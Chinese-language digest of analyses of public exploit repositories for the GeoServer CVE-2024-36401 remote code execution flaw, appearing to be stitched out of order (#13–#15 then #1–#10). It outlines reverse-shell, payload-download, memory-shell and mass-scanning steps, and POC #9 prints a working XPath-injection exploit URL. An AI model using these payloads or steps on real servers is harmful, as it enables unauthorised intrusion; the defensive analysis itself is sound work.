**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

